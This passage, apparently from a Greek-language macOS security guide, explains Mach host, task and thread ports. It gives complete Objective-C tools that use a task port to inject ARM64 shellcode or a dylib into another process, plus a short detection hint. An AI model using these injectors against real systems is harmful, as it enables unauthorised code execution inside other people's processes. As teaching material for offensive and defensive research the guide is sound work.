MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Προνομιακές Θύρες

Υπάρχουν ορισμένες ειδικές θύρες που επιτρέπουν να **εκτελούνται ορισμένες ευαίσθητες ενέργειες ή να αποκτάται πρόσβαση σε ορισμένα ευαίσθητα δεδομένα** σε περίπτωση που μια εργασία έχει τα δικαιώματα **SEND** πάνω τους. Αυτό καθιστά αυτές τις θύρες πολύ ενδιαφέρουσες από την προοπτική ενός επιτιθέμενου, όχι μόνο λόγω των δυνατοτήτων αλλά και επειδή είναι δυνατό να **μοιραστούν τα δικαιώματα SEND μεταξύ εργασιών**.

### Ειδικές Θύρες Φιλοξενίας

Αυτές οι θύρες εκπροσωπούνται από έναν αριθμό.

Τα δικαιώματα **SEND** μπορούν να αποκτηθούν καλώντας **`host_get_special_port`** και τα δικαιώματα **RECEIVE** καλώντας **`host_set_special_port`**. Ωστόσο, και οι δύο κλήσεις απαιτούν την θύρα **`host_priv`** στην οποία μπορεί να έχει πρόσβαση μόνο ο root. Επιπλέον, στο παρελθόν, ο root μπορούσε να καλέσει **`host_set_special_port`** και να καταλάβει αυθαίρετα, κάτι που επέτρεπε, για παράδειγμα, την παράκαμψη υπογραφών κώδικα καταλαμβάνοντας την `HOST_KEXTD_PORT` (το SIP τώρα το αποτρέπει).

Αυτές χωρίζονται σε 2 ομάδες: Οι **πρώτες 7 θύρες ανήκουν στον πυρήνα** και είναι η 1 `HOST_PORT`, η 2 `HOST_PRIV_PORT`, η 3 `HOST_IO_MASTER_PORT` και η 7 είναι `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Αυτές που ξεκινούν **από** τον αριθμό **8** ανήκουν σε **daemon συστήματος** και μπορούν να βρεθούν δηλωμένες στο [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Θύρα φιλοξενίας**: Εάν μια διαδικασία έχει **δικαίωμα SEND** πάνω σε αυτή τη θύρα, μπορεί να αποκτήσει **πληροφορίες** σχετικά με το **σύστημα** καλώντας τις ρουτίνες της όπως:
- `host_processor_info`: Λάβετε πληροφορίες επεξεργαστή
- `host_info`: Λάβετε πληροφορίες φιλοξενίας
- `host_virtual_physical_table_info`: Πίνακας εικονικής/φυσικής μνήμης (απαιτεί MACH_VMDEBUG)
- `host_statistics`: Λάβετε στατιστικά στοιχεία φιλοξενίας
- `mach_memory_info`: Λάβετε διάταξη μνήμης πυρήνα
- **Θύρα Priv φιλοξενίας**: Μια διαδικασία με δικαίωμα **SEND** πάνω σε αυτή τη θύρα μπορεί να εκτελέσει **προνομιακές ενέργειες** όπως η εμφάνιση δεδομένων εκκίνησης ή η προσπάθεια φόρτωσης μιας επέκτασης πυρήνα. Η **διαδικασία πρέπει να είναι root** για να αποκτήσει αυτή την άδεια.
- Επιπλέον, προκειμένου να καλέσει το API **`kext_request`**, απαιτείται να έχει άλλες εξουσιοδοτήσεις **`com.apple.private.kext*`** που δίνονται μόνο σε δυαδικά αρχεία της Apple.
- Άλλες ρουτίνες που μπορούν να κληθούν είναι:
- `host_get_boot_info`: Λάβετε `machine_boot_info()`
- `host_priv_statistics`: Λάβετε προνομιακά στατιστικά στοιχεία
- `vm_allocate_cpm`: Κατανομή Συνεχούς Φυσικής Μνήμης
- `host_processors`: Δικαιώματα αποστολής στους επεξεργαστές φιλοξενίας
- `mach_vm_wire`: Κάντε τη μνήμη μόνιμη
- Καθώς ο **root** μπορεί να έχει πρόσβαση σε αυτή την άδεια, θα μπορούσε να καλέσει `host_set_[special/exception]_port[s]` για να **καταλάβει τις ειδικές ή εξαιρετικές θύρες φιλοξενίας**.

Είναι δυνατό να **δει κανείς όλες τις ειδικές θύρες φιλοξενίας** εκτελώντας:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Αυτοί είναι οι θύρες που είναι κρατημένες για γνωστές υπηρεσίες. Είναι δυνατή η λήψη/ρύθμισή τους καλώντας `task_[get/set]_special_port`. Μπορούν να βρεθούν στο `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Από [εδώ](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Η θύρα που χρησιμοποιείται για τον έλεγχο αυτής της εργασίας. Χρησιμοποιείται για την αποστολή μηνυμάτων που επηρεάζουν την εργασία. Αυτή είναι η θύρα που επιστρέφεται από **mach_task_self (βλ. Task Ports παρακάτω)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Η θύρα εκκίνησης της εργασίας. Χρησιμοποιείται για την αποστολή μηνυμάτων που ζητούν την επιστροφή άλλων θυρών υπηρεσιών συστήματος.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Η θύρα που χρησιμοποιείται για την αίτηση πληροφοριών σχετικά με τον περιέχοντα υπολογιστή. Αυτή είναι η θύρα που επιστρέφεται από **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Η θύρα που ονομάζει την πηγή από την οποία αυτή η εργασία αντλεί τη μνήμη πυρήνα που είναι συνδεδεμένη.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Η θύρα που ονομάζει την πηγή από την οποία αυτή η εργασία αντλεί τη μνήμη που διαχειρίζεται από προεπιλογή.

### Θύρες Εργασίας

Αρχικά, το Mach δεν είχε "διεργασίες", είχε "εργασίες" που θεωρούνταν περισσότερο σαν ένα δοχείο νημάτων. Όταν το Mach συγχωνεύθηκε με το BSD **κάθε εργασία συσχετίστηκε με μια διαδικασία BSD**. Επομένως, κάθε διαδικασία BSD έχει τις λεπτομέρειες που χρειάζεται για να είναι διαδικασία και κάθε εργασία Mach έχει επίσης τις εσωτερικές της λειτουργίες (εκτός από το ανύπαρκτο pid 0 που είναι το `kernel_task`).

Υπάρχουν δύο πολύ ενδιαφέρουσες συναρτήσεις που σχετίζονται με αυτό:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Λάβετε ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ για την θύρα εργασίας της εργασίας που σχετίζεται με το καθορισμένο από το `pid` και δώστε το στην υποδεικνυόμενη `target_task_port` (η οποία είναι συνήθως η εργασία καλούντος που έχει χρησιμοποιήσει το `mach_task_self()`, αλλά θα μπορούσε να είναι μια θύρα ΑΠΟΣΤΟΛΗΣ σε μια διαφορετική εργασία).
- `pid_for_task(task, &pid)`: Δεδομένου ενός ΔΙΚΑΙΩΜΑΤΟΣ ΑΠΟΣΤΟΛΗΣ σε μια εργασία, βρείτε σε ποιο PID σχετίζεται αυτή η εργασία.

Για να εκτελέσει ενέργειες εντός της εργασίας, η εργασία χρειάζεται ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στον εαυτό της καλώντας το `mach_task_self()` (το οποίο χρησιμοποιεί το `task_self_trap` (28)). Με αυτή την άδεια, μια εργασία μπορεί να εκτελέσει πολλές ενέργειες όπως:

- `task_threads`: Λάβετε ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ σε όλες τις θύρες εργασίας των νημάτων της εργασίας
- `task_info`: Λάβετε πληροφορίες σχετικά με μια εργασία
- `task_suspend/resume`: Αναστείλετε ή επαναφέρετε μια εργασία
- `task_[get/set]_special_port`
- `thread_create`: Δημιουργήστε ένα νήμα
- `task_[get/set]_state`: Ελέγξτε την κατάσταση της εργασίας
- και περισσότερα μπορούν να βρεθούν στο [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Σημειώστε ότι με ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ σε μια θύρα εργασίας μιας **διαφορετικής εργασίας**, είναι δυνατό να εκτελούνται τέτοιες ενέργειες σε μια διαφορετική εργασία.

Επιπλέον, η θύρα task_port είναι επίσης η θύρα **`vm_map`** που επιτρέπει να **διαβάσετε και να χειριστείτε τη μνήμη** μέσα σε μια εργασία με συναρτήσεις όπως `vm_read()` και `vm_write()`. Αυτό σημαίνει βασικά ότι μια εργασία με ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στη θύρα task_port μιας διαφορετικής εργασίας θα είναι σε θέση να **εισάγει κώδικα σε αυτή την εργασία**.

Θυμηθείτε ότι επειδή ο **πυρήνας είναι επίσης μια εργασία**, αν κάποιος καταφέρει να αποκτήσει **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ** πάνω από το **`kernel_task`**, θα είναι σε θέση να κάνει τον πυρήνα να εκτελέσει οτιδήποτε (jailbreaks).

- Καλέστε το `mach_task_self()` για να **λάβετε το όνομα** για αυτή τη θύρα για την εργασία καλούντος. Αυτή η θύρα κληρονομείται μόνο μέσω του **`exec()`**; μια νέα εργασία που δημιουργείται με το `fork()` αποκτά μια νέα θύρα εργασίας (ως ειδική περίπτωση, μια εργασία αποκτά επίσης μια νέα θύρα εργασίας μετά το `exec()` σε ένα εκτελέσιμο αρχείο suid). Ο μόνος τρόπος για να δημιουργήσετε μια εργασία και να αποκτήσετε τη θύρα της είναι να εκτελέσετε τον ["χορό ανταλλαγής θυρών"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) ενώ κάνετε ένα `fork()`.
- Αυτοί είναι οι περιορισμοί για την πρόσβαση στη θύρα (από το `macos_task_policy` από το εκτελέσιμο `AppleMobileFileIntegrity`):
- Εάν η εφαρμογή έχει **`com.apple.security.get-task-allow` entitlement** διαδικασίες από τον **ίδιο χρήστη μπορούν να αποκτήσουν πρόσβαση στη θύρα εργασίας** (συνήθως προστίθεται από το Xcode για αποσφαλμάτωση). Η διαδικασία **notarization** δεν θα το επιτρέψει σε παραγωγικές εκδόσεις.
- Εφαρμογές με το **`com.apple.system-task-ports`** entitlement μπορούν να αποκτήσουν τη **θύρα εργασίας για οποιαδήποτε** διαδικασία, εκτός από τον πυρήνα. Σε παλαιότερες εκδόσεις ονομαζόταν **`task_for_pid-allow`**. Αυτό χορηγείται μόνο σε εφαρμογές της Apple.
- **Ο Root μπορεί να αποκτήσει πρόσβαση σε θύρες εργασίας** εφαρμογών **όχι** που έχουν μεταγλωττιστεί με **σκληρή** εκτέλεση (και όχι από την Apple).

**Η θύρα ονόματος εργασίας:** Μια μη προνομιούχος έκδοση της _θύρας εργασίας_. Αναφέρεται στην εργασία, αλλά δεν επιτρέπει τον έλεγχο της. Το μόνο πράγμα που φαίνεται να είναι διαθέσιμο μέσω αυτής είναι το `task_info()`.

### Θύρες Νημάτων

Τα νήματα έχουν επίσης σχετικές θύρες, οι οποίες είναι ορατές από την εργασία που καλεί το **`task_threads`** και από τον επεξεργαστή με `processor_set_threads`. Ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στη θύρα νήματος επιτρέπει τη χρήση της συνάρτησης από το υποσύστημα `thread_act`, όπως:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Οποιοδήποτε νήμα μπορεί να αποκτήσει αυτή τη θύρα καλώντας το **`mach_thread_sef`**.

### Εισαγωγή Shellcode σε νήμα μέσω Θύρας Εργασίας

Μπορείτε να αποκτήσετε ένα shellcode από:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Συγκεντρώστε** το προηγούμενο πρόγραμμα και προσθέστε τα **entitlements** για να μπορείτε να εισάγετε κώδικα με τον ίδιο χρήστη (αν όχι, θα χρειαστεί να χρησιμοποιήσετε **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Για να λειτουργήσει αυτό στο iOS, χρειάζεστε την εξουσία `dynamic-codesigning` προκειμένου να μπορείτε να δημιουργήσετε ένα εκτελέσιμο μνήμης που είναι εγγράψιμο.

### Εισαγωγή Dylib σε νήμα μέσω Task port

Στο macOS, **τα νήματα** μπορεί να χειριστούν μέσω **Mach** ή χρησιμοποιώντας το **posix `pthread` api**. Το νήμα που δημιουργήσαμε στην προηγούμενη εισαγωγή, δημιουργήθηκε χρησιμοποιώντας το Mach api, οπότε **δεν είναι συμβατό με posix**.

Ήταν δυνατό να **εισαχθεί ένας απλός κώδικας shell** για να εκτελέσει μια εντολή επειδή **δεν χρειαζόταν να λειτουργεί με apis συμβατά με posix**, μόνο με Mach. **Πιο σύνθετες εισαγωγές** θα χρειάζονταν το **νήμα** να είναι επίσης **συμβατό με posix**.

Επομένως, για να **βελτιωθεί το νήμα**, θα πρέπει να καλέσει **`pthread_create_from_mach_thread`** που θα **δημιουργήσει ένα έγκυρο pthread**. Στη συνέχεια, αυτό το νέο pthread θα μπορούσε να **καλέσει dlopen** για να **φορτώσει ένα dylib** από το σύστημα, έτσι ώστε αντί να γράφει νέο κώδικα shell για να εκτελέσει διάφορες ενέργειες, είναι δυνατό να φορτώσει προσαρμοσμένες βιβλιοθήκες.

Μπορείτε να βρείτε **παραδείγματα dylibs** σε (για παράδειγμα, αυτό που δημιουργεί ένα log και στη συνέχεια μπορείτε να το ακούσετε):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Σε αυτή την τεχνική, ένα νήμα της διαδικασίας καταλαμβάνεται:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Όταν καλείται το `task_for_pid` ή το `thread_create_*`, αυξάνει έναν μετρητή στη δομή task από τον πυρήνα, ο οποίος μπορεί να προσπελαστεί από τη λειτουργία χρήστη καλώντας task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

